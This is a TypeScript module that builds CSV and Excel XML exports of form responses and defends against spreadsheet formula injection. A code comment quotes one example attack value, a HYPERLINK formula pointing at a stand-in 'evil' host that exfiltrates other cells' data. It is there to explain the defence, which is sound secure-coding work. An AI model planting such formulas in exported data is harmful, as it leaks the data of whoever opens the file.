/** Pure CSV formatting for response export, kept free of the Supabase import so it can be unit tested directly. */

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '';
  let s = Array.isArray(value) ? value.join('; ') : String(value);
  // CSV/formula injection defense: a cell starting with =, +, -, @, a tab or
  // a carriage return is interpreted by Excel/Google Sheets as the start of
  // a formula when this file is opened there - so a respondent's own
  // free-text answer (e.g. "=HYPERLINK(\"https://evil/\"&A1)") could run a
  // formula, or exfiltrate other cells' data, in whoever exports and opens
  // it. A leading single quote forces the cell to plain text in every major
  // spreadsheet application without changing what a human reader sees.
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function toCsv(rows: Record<string, unknown>[]): string {
  if (rows.length === 0) return '';
  const headers = Object.keys(rows[0]);
  const lines = [headers.join(',')];
  for (const row of rows) lines.push(headers.map(h => csvCell(row[h])).join(','));
  return lines.join('\r\n');
}

// ── Excel ───────────────────────────────────────────────────────────────
// A real Excel file without a spreadsheet library: the "XML Spreadsheet 2003"
// format opens in Excel, LibreOffice and Google Sheets. Cells are typed: a value
// that is unmistakably a plain number becomes a number (so it can be summed and
// charted), everything else is text - and text cells are never evaluated as
// formulas, so the injection defence CSV needs is built in here.

const XML_ILLEGAL = /[\u0000-\u0008\u000B\u000C\u000E-\u001F\uFFFE\uFFFF]/g;

export function xmlEscape(s: string): string {
  return s.replace(XML_ILLEGAL, '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

/** Plain numbers only: no leading zeros (a code like 00123 stays text), no exponent, at most 15 significant digits. */
export function isPlainNumber(s: string): boolean {
  return /^-?(0|[1-9]\d{0,14})(\.\d{1,10})?$/.test(s) && s.replace(/\D/g, '').length <= 15;
}

function excelCell(value: unknown): string {
  if (value === null || value === undefined || value === '') return '<Cell/>';
  const s = Array.isArray(value) ? value.join('; ') : String(value);
  return isPlainNumber(s)
    ? `<Cell><Data ss:Type="Number">${s}</Data></Cell>`
    : `<Cell><Data ss:Type="String">${xmlEscape(s)}</Data></Cell>`;
}

export function toExcelXml(rows: Record<string, unknown>[], sheetName = 'Responses'): string {
  const headers = rows.length ? Object.keys(rows[0]) : [];
  const name = xmlEscape(sheetName.replace(/[\\/?*[\]:]/g, ' ').slice(0, 31) || 'Sheet1');
  const head = headers.map(h => `<Cell ss:StyleID="h"><Data ss:Type="String">${xmlEscape(h)}</Data></Cell>`).join('');
  const body = rows.map(r => `<Row>${headers.map(h => excelCell(r[h])).join('')}</Row>`).join('');
  return `<?xml version="1.0" encoding="UTF-8"?>
<?mso-application progid="Excel.Sheet"?>
<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet" xmlns:ss="urn:schemas-microsoft-com:office:spreadsheet">
<Styles><Style ss:ID="h"><Font ss:Bold="1"/><Interior ss:Color="#E8EEF7" ss:Pattern="Solid"/></Style></Styles>
<Worksheet ss:Name="${name}"><Table><Row>${head}</Row>${body}</Table></Worksheet>
</Workbook>`;
}
